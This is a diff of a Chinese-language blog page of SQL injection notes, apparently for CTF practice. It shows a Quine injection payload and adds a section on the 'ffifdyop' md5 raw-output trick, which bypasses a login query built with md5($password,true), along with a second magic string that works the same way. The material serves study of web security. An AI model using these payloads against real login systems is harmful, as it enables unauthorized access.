@@ -477,6 +477,15 @@ eg:
 &#39;/**/union/**/SELECT/**/REPLACE(REPLACE(&#39;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#39;,CHAR(34),CHAR(39)),CHAR(46),&#39;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#39;)/**/AS/**/ch3ns1r#
 </code></pre>
 <p>Quine注入说白了就是套娃，导致输入和输出一模一样</p>
+<h1 id="神奇字符串绕过"><a href="#神奇字符串绕过" class="headerlink" title="神奇字符串绕过"></a>神奇字符串绕过</h1><blockquote>
+<p>SELECT * FROM admin WHERE username &#x3D; ‘admin’ and password &#x3D; ‘“.md5($password,true).”‘<br>中使用</p>
+</blockquote>
+<p><code>ffifdyop</code>经过md5加密后：276f722736c95d99e921722cf9ed621c<br>再转换为字符串：’or’6&lt;乱码&gt;  即  <code>&#39;or&#39;66�]��!r,��b</code></p>
+<p>用途：</p>
+<p>select * from admin where password&#x3D;’’or’6&lt;乱码&gt;’</p>
+<p>就相当于select * from admin where password&#x3D;’’or 1  实现sql注入</p>
+<p>不光有<code>ffifdyop</code> 还有 <code>129581926211651571912466741651878684928</code> 也可达同样的效果</p>
+<p>总之，相当于 <code>select * from admin where password=&#39;&#39;or ture</code></p>
 
         </div>
         <!-- .entry-content -->
